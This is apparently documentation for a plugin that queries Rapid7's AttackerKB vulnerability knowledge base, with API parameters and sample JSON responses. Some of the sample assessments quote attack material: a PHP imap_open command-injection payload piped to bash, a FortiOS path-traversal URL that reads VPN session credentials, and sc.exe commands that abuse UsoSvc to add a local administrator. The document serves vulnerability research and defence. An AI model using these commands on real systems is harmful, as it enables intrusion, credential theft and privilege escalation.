# Description

[Rapid7's AttackerKB](http://attackerkb.com/) is a knowledge base of vulnerabilities and informed opinions on what makes them valuable (or not) targets for exploitation

# Key Features

* Search for vulnerabilities
* Obtain vulnerability assessment information

# Requirements

* Requires an API Key

# Documentation

## Setup

The connection configuration accepts the following parameters:

|Name|Type|Default|Required|Description|Enum|
|----|----|-------|--------|-----------|----|
|credentials|credential_secret_key|None|True|API key from account e.g. YYDHZKByMaDTMmY4ZC12MmUxLTkyTTBtY2UxUzkxNjbbYWI2OMzLYjATHjABZ9x3MUhyVUEzMWF1N0E5QThDOEhsQTRrMW1GVDZWUGVaDnA9|None|
|max_pages|integer|100|False|Max pages returned, default 100|None|

Example input:

```
{
  "credentials": {
    "secretKey": "YYDHZKByMaDTMmY4ZC12MmUxLTkyTTBtY2UxUzkxNjbbYWI2OMzLYjATHjABZ9x3MUhyVUEzMWF1N0E5QThDOEhsQTRrMW1GVDZWUGVaDnA9"
  },
  "max_pages": 100
}
```

## Technical Details

### Actions

#### Get Assessment

This action is used to return a single assessment with the specified ID.

##### Input

|Name|Type|Default|Required|Description|Enum|
|----|----|-------|--------|-----------|----|
|id|string|None|True|The UUID of a specific assessment to return|None|

Example input:

```
{
  "id": "a2c54f3d-48d0-48c4-b056-3a78181d777c"
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|assessment|False|Returned assessment data|

Example output:

```
{
  "data": {
    "created": "2020-03-25T00:59:58.868978Z",
    "document": "The `imap_open` function within php, if called without the `/norsh` flag, will attempt to preauthenticate an IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's `ProxyCommand` option can be passed from imap_open to execute arbitrary commands.\r\nThe execution flow of this, on Debian systems is as such:\r\n\r\n1. PHP `imap_open` via `rsh`\r\n2. `rsh` aliased to `ssh`\r\n3. SSH's `ProxyCommand` RCE\r\n\r\nThere were some other nuances, such as not allowing spaces (`$IFS$()` is OK).  Typical execution of this at the SSH side was to base64 encode the payload and pipe it to bash: ```\"-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`\"```.\r\n\r\nThe trick is finding where a webapp calls the `imap_open` functionality.  Typically this is in a higher privileged part of the webapp, since it could be destructive (such as disabling notifications).  Some webapps seem to include the function call, but never call the function which uses it (maybe there for plugins to use?).",
    "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
    "id": "b550e76b-5c86-412e-a2a9-937b075f5b96",
    "metadata": {
      "attacker-value": 2,
      "exploitability": 3
    },
    "revisionDate": "2020-03-25T00:59:58.872884Z",
    "score": 1,
    "topicId": "35cb145f-3b4b-4c42-b848-f9cc0cf6a503"
  }
}
```

#### Search Assessments

This action is used to return all assessments.

##### Input

|Name|Type|Default|Required|Description|Enum|
|----|----|-------|--------|-----------|----|
|created|string|None|False|Return all assessments that were created on the given date, eg. 2019-07-04|None|
|document|string|None|False|Text to query the document parameter. A substring match is performed, eg. RDP|None|
|editorId|string|None|False|The UUID of a contributor|None|
|id|string|None|False|The UUID of a specific assessment to return|None|
|page|integer|0|False|Pagination page number, default value is 0|None|
|revisionDate|string|None|False|Return all assessments that were last edited on the given date, eg. 2019-07-04|None|
|size|integer|10|False|The number of assessments returned per page, default value is 10|None|
|topicId|string|None|False|The UUID of the topic this assessment was based on|None|

Example input (search by id):

```
{
  "id": "47f78818-b766-47ca-8262-d7abc8dced66"
}
```

Example input (search by editorId):

```
{
  "editorId": "e24cfb2f-e51a-44d3-9204-e322a8db7ce1"
}
```

Example input (search all):

```
{}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|[]assessment|False|Returned assessment data|

Example output:

```
{
  "data": [
    {
      "created": "2020-03-25T20:04:57.831425Z",
      "document": "\r\n**Description**\r\n\r\nDue to a pre-authenticated Path Trasversal vulnerability under the SSL VPN portal on FortiOS, an attacker is able to pull arbitrary system files from the file system. One of the most critical files which an attacker may pull is \"sslvpn_websessions\" which contains session information including usernames and password.\r\n\r\nOnce the attacker has obtained the credentials from this file, he can authenticated with those credentials, compromising the corporate perimeter.\r\n\r\n**Mitigation**\r\n\r\n- Upgrade to FortiOS 5.4.13, 5.6.8, 6.0.5 or 6.2.0 and above.\r\n- Enable 2FA. Note the attacker will not be able to log in to the VPN, but the obtained credentials are still valid (potencial domain creds) to access corporate mail, etc.\r\n\r\n**Affected Systems**\r\n\r\n- FortiOS 6.0: 6.0.0 to 6.0.4\r\n- FortiOS 5.6: 5.6.3 to 5.6.7\r\n- FortiOS 5.4: 5.4.6 to 5.4.12\r\n\r\nNOTE: Only if the SSL VPN service (web-mode or tunnel-mode) is enabled.\r\n\r\n**PoC**\r\n\r\nThere are some public working exploits for this vulnerability, targeting the \"sslvpn_websessions\" system file.\r\n\r\nAn attacker would access the following URL:\r\n- https://\u003cIP_ADDRESS\u003e/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\r\n\r\nAnd after some parsing to the binary file, something like the following output would be obtained:\r\n\r\n![LOGO] (https://devco.re/assets/img/blog/20190807/4.png)\r\n\r\nNOTE: Example image obtained from https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/\r\n\r\n",
      "editorId": "10bfc743-3786-435c-88e8-56e791bbc053",
      "id": "6db90257-86b5-4748-ae01-82cea24fcfdb",
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "tags": [
          "easy_to_develop",
          "pre_auth"
        ]
      },
      "revisionDate": "2020-03-25T20:04:57.835948Z",
      "score": 1,
      "topicId": "35b88369-c440-49c0-98ff-c50e258fb32c"
    },
    {
      "created": "2020-03-25T15:59:33.70864Z",
      "document": "This is an elevation of privilege vulnerability that exists when Windows improperly handles authentication requests by leveraging the Update Orchestrator Service. If an attacker successfully exploits this vulnerability they can run processes in an elevated context. \r\n\r\n\r\n**Prerequisite**:  \r\n\r\nThe Update Orchestrator Service runs as NT AUTHORITY\\SYSTEM and any user in the group NT AUTHORITY\\SERVICE have full access to modify the service.\r\n\r\nIt is known to affect Windows 10 1803 and above that have not been updated with the November 12th, 2019 security update patch (or above).\r\n \r\n\r\n**Exploitation**: \r\n\r\nCreate tmpUser, add to local administrators group, and reset the service to its default state.\r\n\r\n```sh\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"cmd /c net user /add tmpUser tmpPassword123\"\r\nsc.exe start UsoSvc\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"cmd /c net localgroup Administrators /add tmpUser\"\r\nsc.exe start UsoSvc\r\nsc.exe stop UsoSvc\r\nsc.exe config UsoSvc binPath=\"C:\\Windows\\System32\\svchost.exe -k netsvcs -p\"\r\nsc.exe start UsoSvc\r\n```",
      "editorId": "476d5018-c9fe-422d-825b-d5601af6bcf0",
      "id": "47f78818-b766-47ca-8262-d7abc8dced66",
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "tags": [
          "high_privilege_access"
        ]
      },
      "revisionDate": "2020-03-25T15:59:33.712345Z",
      "score": 1,
      "topicId": "8011789d-8681-4c89-a088-8e14d395987f"
    }
  ]
}
```

#### Get Vulnerability

This action is used to return a single topic with the specified ID.

##### Input

|Name|Type|Default|Required|Description|Enum|
|----|----|-------|--------|-----------|----|
|id|string|None|True|The UUID of a specific topic to return|None|

Example input:

```
{
  "id": "a2c54f3d-48d0-48c4-b056-3a78181d777c"
}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|topic|False|Returned topic data|

Example output:

```
{
  "data": {
    "created": "2020-03-25T22:30:05.350662Z",
    "document": "By carefully crafting promise resolutions, it was possible to cause an out-of-bounds read off the end of an array resized during script execution. This could have led to memory corruption and a potentially exploitable crash. This vulnerability affects Thunderbird \u003c 68.6, Firefox \u003c 74, Firefox \u003c ESR68.6, and Firefox ESR \u003c 68.6.",
    "editorId": "e24cfb2f-e51a-44d3-9204-e322a8db7ce1",
    "id": "a2c54f3d-48d0-48c4-b056-3a78181d777c",
    "metadata": {
      "references": [
        "CVE-2020-6806",
        "https://www.mozilla.org/security/advisories/mfsa2020-08/",
        "https://www.mozilla.org/security/advisories/mfsa2020-10/",
        "https://www.mozilla.org/security/advisories/mfsa2020-09/",
        "https://bugzilla.mozilla.org/show_bug.cgi?id=1612308"
      ],
      "vulnerable-versions": [
        "Thunderbird 68.6",
        "Firefox 74",
        "Firefox ESR68.6",
        "Firefox ESR 68.6"
      ]
    },
    "name": "CVE-2020-6806",
    "revisionDate": "2020-03-25T22:30:05.350662Z",
    "score": {
      "attackerValue": 0,
      "exploitability": 0
    },
    "tags": {
      "commonEnterprise": 0,
      "defaultConfiguration": 0,
      "difficultToDevelop": 0,
      "difficultToExploit": 0,
      "difficultToPatch": 0,
      "easyToDevelop": 0,
      "highPrivilegeAccess": 0,
      "noUsefulData": 0,
      "obscureConfiguration": 0,
      "postAuth": 0,
      "preAuth": 0,
      "requiresInteraction": 0
    }
  }
}
```

#### Search Vulnerabilities

This action is used to return all topics.

##### Input

|Name|Type|Default|Required|Description|Enum|
|----|----|-------|--------|-----------|----|
|created|string|None|False|Return all topics that were created on the given date, eg. 2019-07-04|None|
|disclosureDate|string|None|False|Return all topics that were disclosed on the given date, eg. 2019-07-04|None|
|document|string|None|False|Text to query the document parameter. A substring match is performed, eg. RDP|None|
|editorId|string|None|False|The UUID of a contributor|None|
|id|string|None|False|The UUID of a specific topic to return|None|
|name|string|None|False|Text to query the name parameter. A substring match is performed|None|
|page|integer|0|False|Pagination page number, default value is 0|None|
|revisionDate|string|None|False|Return all topics that were last edited on the given date, eg. 2019-07-04|None|
|size|integer|10|False|The number of topics returned per page, default value is 10|None|

Example input (search by editorId):

```
{
  "editorId": "e24cfb2f-e51a-44d3-9204-e322a8db7ce1"
}
```

Example input (search by name):

```
{
  "name": "CVE-2020-3789"
}
```

Example input (search all):

```
{}
```

##### Output

|Name|Type|Required|Description|
|----|----|--------|-----------|
|data|[]topic|False|Returned topic data|

Example output:

```
{
  "data": [
    {
      "created": "2020-03-25T22:30:05.803209Z",
      "document": "Mozilla developers reported memory safety and script safety bugs present in Firefox 73. Some of these bugs showed evidence of memory corruption or escalation of privilege and we presume that with enough effort some of these could have been exploited to run arbitrary code. This vulnerability affects Firefox \u003c 74.",
      "editorId": "e24cfb2f-e51a-44d3-9204-e322a8db7ce1",
      "id": "da38db6d-489a-44c3-975a-2c245a7dae01",
      "metadata": {
        "references": [
          "CVE-2020-6815",
          "https://www.mozilla.org/security/advisories/mfsa2020-08/",
          "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1181957%!C(MISSING)1557732%!C(MISSING)1557739%!C(MISSING)1611457%!C(MISSING)1612431"
        ],
        "vulnerable-versions": [
          "Firefox 74"
        ]
      },
      "name": "CVE-2020-6815",
      "revisionDate": "2020-03-25T22:30:05.803209Z",
      "score": {
        "attackerValue": 0,
        "exploitability": 0
      },
      "tags": {
        "commonEnterprise": 0,
        "defaultConfiguration": 0,
        "difficultToDevelop": 0,
        "difficultToExploit": 0,
        "difficultToPatch": 0,
        "easyToDevelop": 0,
        "highPrivilegeAccess": 0,
        "noUsefulData": 0,
        "obscureConfiguration": 0,
        "postAuth": 0,
        "preAuth": 0,
        "requiresInteraction": 0
      }
    },
    {
      "created": "2020-03-25T22:30:05.762863Z",
      "document": "Mozilla developers reported memory safety bugs present in Firefox and Thunderbird 68.5. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code. This vulnerability affects Thunderbird \u003c 68.6, Firefox \u003c 74, Firefox \u003c ESR68.6, and Firefox ESR \u003c 68.6.",
      "editorId": "e24cfb2f-e51a-44d3-9204-e322a8db7ce1",
      "id": "73689399-1a48-4e13-a193-b5d40d9e17f3",
      "metadata": {
        "references": [
          "CVE-2020-6814",
          "https://www.mozilla.org/security/advisories/mfsa2020-08/",
          "https://www.mozilla.org/security/advisories/mfsa2020-10/",
          "https://www.mozilla.org/security/advisories/mfsa2020-09/",
          "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1592078%!C(MISSING)1604847%!C(MISSING)1608256%!C(MISSING)1612636%!C(MISSING)1614339"
        ],
        "vulnerable-versions": [
          "Thunderbird 68.6",
          "Firefox 74",
          "Firefox ESR68.6",
          "Firefox ESR 68.6"
        ]
      },
      "name": "CVE-2020-6814",
      "revisionDate": "2020-03-25T22:30:05.762863Z",
      "score": {
        "attackerValue": 0,
        "exploitability": 0
      },
      "tags": {
        "commonEnterprise": 0,
        "defaultConfiguration": 0,
        "difficultToDevelop": 0,
        "difficultToExploit": 0,
        "difficultToPatch": 0,
        "easyToDevelop": 0,
        "highPrivilegeAccess": 0,
        "noUsefulData": 0,
        "obscureConfiguration": 0,
        "postAuth": 0,
        "preAuth": 0,
        "requiresInteraction": 0
      }
    }
  ]
}
```

### Triggers

_This plugin does not contain any triggers._

### Custom Output Types

#### assessment

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Created|string|False|The date and time the assessment was created, eg. 2019-07-02T16:22:15.879357Z|
|Document|string|True|The main content of the assessment|
|Editor ID|string|False|The UUID of the contributor who last edited the assessment|
|ID|string|False|The UUID of the assessment|
|Metadata|object|False|A JSON value containing key/value pairs describing various attributes about this assessment|
|Revision Date|string|False|The date and time the assessment was last changed, eg. 2019-07-02T16:22:15.879357Z|
|Topic ID|string|True|The UUID of the topic this assessment is based on|

#### link

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Href|string|True|URL for paginated resource|

#### score

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Attacker Value|float|False|The attacker value score|
|Exploitability|float|False|The exploitability score|

#### tags

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Common Enterprise|float|False|The 'Common in enterprise' score|
|Default Configuration|float|False|The 'Present in default configuration' score|
|Difficult To Develop|float|False|The 'Difficult to develop' score|
|Difficult To Exploit|float|False|The 'High barrier to exploitation' score|
|Difficult To Patch|float|False|The 'Difficult to patch' score|
|Easy To Develop|float|False|The 'Easy to develop' score|
|High Privilege Access|float|False|The 'Allows high-privileged access' score|
|No Useful Data|float|False|The 'Does not produce useful data' score|
|Obscure Configuration|float|False|The 'Only present in obscure configuration' score|
|Post Auth|float|False|The 'Post-Auth' score|
|Pre Auth|float|False|The 'Pre-Auth' score|
|Requires Interaction|float|False|The 'Requires user interaction' score|

#### topic

|Name|Type|Required|Description|
|----|----|--------|-----------|
|Created|string|False|The date and time the topic was created, eg. 2019-07-02T16:22:15.879357Z|
|Disclosure Date|string|False|The date and time the topic was disclosed, eg. 2019-07-02T16:22:15.879357Z|
|Document|string|True|The main content of the topic|
|Editor ID|string|False|The UUID of the contributor who last edited the topic|
|ID|string|False|The UUID of the topic|
|Metadata|object|False|A JSON value containing key/value pairs describing various attributes about this topic|
|Name|string|True|The name or title of the topic|
|Revision Date|string|False|The date and time the topic was last changed, eg. 2019-07-02T16:22:15.879357Z|
|Score|score|False|The topic score properties|
|Tags|tags|False|The frequencies with which various tags appear on assessments|

## Troubleshooting

This plugin does not contain any troubleshooting information.

# Version History

* 1.0.0 - Initial plugin

# Links

## References

* [Rapid7 AttackerKB](https://attackerkb.com/)
* [Rapid7 AttackerKB API](https://api.attackerkb.com/api-docs/docs)
